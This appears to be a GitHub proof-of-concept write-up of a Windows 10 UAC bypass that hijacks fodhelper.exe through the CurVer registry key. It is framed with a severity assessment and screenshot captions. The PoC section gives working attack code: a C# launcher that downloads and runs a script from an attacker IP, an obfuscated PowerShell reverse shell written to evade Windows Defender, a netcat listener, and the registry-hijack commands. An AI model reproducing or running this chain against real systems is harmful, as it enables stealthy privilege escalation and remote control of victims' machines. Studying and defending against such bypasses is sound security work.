# UAC-Bypass-2023

## User Account Control Bypass without triggering Windows Defender
## Author: Ruggero Tafuro
## Date: 13-05-2023

## What is UAC?
UAC (User Account Control) is a security mechanism present in Windows operating systems that limits the
access of programs to user accounts with elevated privileges, such as administrators.
Its main strength is to protect the system from malware attacks, which try to exploit vulnerabilities to gain
administrator privileges and compromise the system.
UAC works by asking for explicit permission from the user whenever a program requests access to protected operating system resources, such as system folders, the system registry or security settings.
In this way, UAC prevents unauthorized or potentially harmful programs from modifying the system without the user’s consent.
Additionally, UAC can also help prevent user errors that could compromise system security. For example,
when a non-administrator user tries to perform an action that requires elevated privileges, UAC prompts
the user to provide administrator credentials to
grant permission.
In summary, the strength of UAC lies in its ability to limit the access of programs to administrator privileges and to request explicit user authorization whenever access to protected operating system resources is
requested.
This can help prevent malware attacks and user errors that could compromise system security.

## Fodhelper and the system registry:
Windows 10 environments allow users to manage language settings for a variety of Windows features
such as typing, text-to-speech etc.
When a user requests to open “Manage optional features” in Windows Settings to change the language, a
process under the name fodhelper.exe is created.
This process is running in high integrity because the binary file has the auto-elevation setting set to “true”.
“CurVer” is a Windows registry subkey that is used to specify the current version of a given object class or
registry path. This value is used to determine which version of an application or component the system
should load when prompted.
For example, when an application or component is installed on the system, it is usually recorded in the
system registry. The “CurVer” subfolder can be used to specify the current version of that application or
component, letting the system know which version to load when prompted.

## Bypass:
In Windows 10 an attacker in possession of a user with administrative privileges, but with a “medium”
level label, is allowed to generate a process with superior privileges (“high” level label).
This is possible thanks to the creation of keys within the system registry that manipulate the normal execution expected by fodhelper, so that it executes commands with elevated privileges bypassing the User
Account Contol (UAC) by executing .exe files.
Everything is reproducible without the Windows Defender detection.

## Severity:
The impact of the bypass that I personally evaluate is HIGH as it allows anyone authenticated with an administrative user with an RCE vulnerability to increase the integrity of their processes to “high”.
This exploit is currently exploitable within Windows 10 updated to the latest version.
In fact, in the following images you can see how the test system has been updated to the latest patch
available.

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/c3136cd3-ae03-4a1f-9195-63facfc40269)

*1. List of Windows Update patches installed on the system*




![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/c26f4a81-832a-4923-af3b-b87165e95371)

*2. Windows Update - update to the latest available version released*




Windows Defender is correctly active in all its features
![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/1b235a9a-2110-490a-b14b-7dca5bc91487)

*3. Windows Defender features*



## PoC:
We can assume that an attacker is already inside the target machine with an administrative user (in this
case “rugge”) and has the possibility to execute commands (RCE) inside a powershell.
For convenience and clarity, the commands will be executed by the user “rugge” directly from the target
system, but everything can also be reproduced in a scenario in which the attacker executes the commands
remotely.
The target machine will have the IP as shown:

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/23d2ac14-fcb2-4d43-b7f8-1116d9ea2a96)

*4. IP Windows (target)*

While the attacking machine running Ubuntu 22.04 will have ip:

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/eea1efa5-73af-4041-8556-2f9f8cb25d1e)

*5. Ubuntu IP (attacker)*

The aim is to modify the fodhelper registers in particular HKCU:\Software\Classes\ms-settings\CurVer
pointing to a specially created one (HKCU\Software\Classes\.hack\Shell\Open\command) which will contain the executable (revs.exe) which will be run as soon as we call fodhelper.exe.

So let’s create an executable whose main purpose is to run a powershell.exe (copied from “C:\Windows\
System32\WindowsPowerShell\v1.0” and renamed to “ps.exe” inside a temporary folder “tempp ” so as
not to make Defender and/or a system user suspicious) with the sole command of executing in memory
the code contained in the file (script.ps1) that the target Windows will find at the address of the http
python simple-server that is hosted by the attacking machine (http://172.20.10.14:8000/script.ps1)
A possible source code example of the executable:

```
 using System;
 namespace PowerShellProject
 {
 class Program
 {
 static void Main(string[] args)
 {
 System.Diagnostics.Process.Start(@”C:\tempp\ps.exe”, “-c \”IEX([Net.Webclient]::new().DownloadString(‘http://172.20.10.14:8000/script.ps1’))\””);
 }
 }
 }
```

Once the code has been compiled and transferred to the target machine in the “tempp” temporary folder,
what we will have to do is to start the http python simple-server on the attacking machine with the same
listening port as the one in the “revs.exe”

```
 $ python3 -m http.server --bind 172.20.10.14 8000 
```
The script that will be requested by the target is nothing more than a simple obfuscated reverse shell to
not trigger Windows Defender:

example script.ps1 
``` 
$client = Ne’’w-Object System.Net.Sockets.TCPClient(‘172.20.10.14’,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘> ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Finally, still on the attacking machine, in another bash shell window we will start a “listener” ready to capture the outgoing connection of the reverse shell performed within the target machine.

``` 
 $ nc -lvnp 4444
``` 
So let’s go back to the target system and start executing the commands within a powershell that will
change the system registers.
The first command will launch the cmd to add a custom file association for the “.hack” extension in the
Windows registry, which allows you to open the .hack files with the revs.exe application present in the “C:\tempp\revs\revs\bin\Debug\net6.0”.

``` 
cmd /c ‘call reg add “HKCU\Software\Classes\.hack\Shell\Open\command” /v “” /d “\”C:\tempp\revs\revs\bin\Debug\net6.0\revs.exe\”” /f’
``` 

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/2e424062-0893-4ff0-8286-b29f3a69c557)

*6. Registry key associated to .hack with call to revs.exe*

The second command instead will launch cmd which sets the “.hack” extension as the default value for
displaying system settings in Windows

```
cmd /c ‘call reg add “HKCU\Software\Classes\ms-settings\CurVer” /d “.hack” /f’
```

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/3f2871ee-82e6-4137-a9d6-63debce635c1)

*7. CurVer registry key referenced to .hack registry key*

At this point everything is ready to call fodhelper and receive the connection from the target Windows on
the attacking machine

```
cmd /c ‘call fodhelper.exe’
```

With this call fodhelper will use the memory registers which will start the executable revs.exe which will
contact the python server offering the script.ps1 which, once executed, will establish a connection to the
attacking machine creating a reverse shell with integrity level “high ”

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/1fc84235-1d46-4013-96ea-2d9332034613)

*8. Execute commands writing values to the system registry and calling revs.exe*




![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/63bb6a96-bc59-4c04-a8d6-fea8d550b07e)

*9.Target Windows GET request to the attacking server*




![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/2b3bcfec-ab43-4a22-aeeb-81880beb86fb)

*10. Reverse shell integrity level obtained by the attacking machine*




We can also notify how Windows Defender did not get alarmed during operations and let us reach the goal
without its interference

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/b0d9c77d-32a8-4b17-9ff8-db21e1abdfc7)

*11. No threats detected by Windows Defender*



In this last image demonstrating the elevation of privileges, the integrity level (medium) of the powershell
on which we executed the commands is shown

![image](https://github.com/Rugeniere/UAC-Bypass-2023/assets/73703319/e9f28102-c7d4-4400-834f-42d7a0a3035b)

*12. Original powershell integrity level*


